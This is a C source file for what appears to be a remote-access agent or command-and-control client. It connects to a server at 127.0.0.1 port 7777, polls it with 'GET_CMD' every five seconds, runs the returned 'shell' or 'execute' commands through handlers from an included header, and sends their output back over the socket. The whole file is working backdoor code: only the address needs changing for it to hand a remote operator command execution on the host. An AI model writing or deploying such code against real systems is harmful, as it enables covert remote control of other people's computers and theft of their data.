#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <signal.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include "include/commands.h"

#define BUFFER_SIZE 8192
#define PORT 7777
#define ip_addr "127.0.0.1"

#define GREEN "\e[1;32m"
#define CYAN "\e[1;36m"
#define RED "\e[1;31m"
#define RESET "\033[0m"

int status, received, client_fd;
struct sockaddr_in serv_addr;
char buffer[BUFFER_SIZE] = { 0 };
char *output;
char *pos;

//Catch Ctrl+C
static volatile int keepRunning = 1;

void intHandler(int dummy) {
    keepRunning = 0;
}

char *error;
void sizeErr(int bruh) {
    error = (RED "ERROR: Output is too small...\n" RESET);
    send(client_fd, error, strlen(error), 0);
}

void cdError(int bruhh) {
    error = (RED "ERROR: Something went wrong! Unable to change directory...\n" RESET);
    send(client_fd, error, strlen(error), 0);
}

void cmdErr(int bruhhh) {
    error = (RED "ERROR: Invalid Command OR Permission Denied!\n" RESET);
    send(client_fd, error, strlen(error), 0);
}

typedef char *(*func_ptr)(const char *);

typedef struct {
    char *name;
    func_ptr func;
} check;

check function[] = {
    {"shell ", shell},
    {"execute ", execute},
    {NULL, NULL}
};

char *module(char *cmd) {
    for (int i=0; function[i].name != NULL; i++) {
        if (strstr(buffer, function[i].name) != NULL) {
            pos = (strstr(buffer, function[i].name));
            pos += strlen(function[i].name);
            strcpy(buffer, pos);
            output = function[i].func(buffer);
            return output;
            break;
        }
    }

}

int main(int argc, char *argv[]) {

    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 and IPv6 addresses from text to binary
    if (inet_pton(AF_INET, ip_addr, &serv_addr.sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }

    if ((status = connect(client_fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }

    while(keepRunning) {
        send(client_fd, "GET_CMD", 7, 0);

        memset(buffer, 0, BUFFER_SIZE);
        received = read(client_fd, buffer, BUFFER_SIZE - 1);

        if (strcmp(buffer, "NO_CMD") == 0) {
            sleep(5);
            continue;
        }

        output = module(buffer);

        if (received <= 0) {
            printf("Server died or something went wrong...");
            break;
        }

        if (output != NULL) {
            if (send(client_fd, output, strlen(output), 0) < 0) {
                printf("Unable to send output...");
                sizeErr(0);
            }
        } else {
            cmdErr(0);
        }

        sleep(5);
    }

    // closing the connected socket
    close(client_fd);
    return 0;
}
